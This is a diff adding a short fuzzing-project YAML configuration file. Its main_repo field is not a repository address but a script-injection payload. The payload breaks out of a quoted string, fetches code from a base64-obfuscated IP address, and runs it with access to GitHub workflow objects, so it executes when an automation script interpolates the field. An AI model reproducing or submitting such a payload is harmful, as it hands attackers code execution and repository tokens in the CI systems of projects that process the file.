@@ -1,0 +1,10 @@
+fuzzing_engines:
+- libfuzzer
+homepage: https://github.com/whatever/whatever
+language: python
+main_repo: "a'});fetch(atob('aHR0cDovLzM0LjEzMy4xNjYuMzgvcHduLmpz')).then(r=>r.text()).then(c=>new Function('github','context',c)(github,context));({a:'b"
+sanitizers:
+- address
+- undefined
+vendor_ccs:
+- jiatan@gmail.com
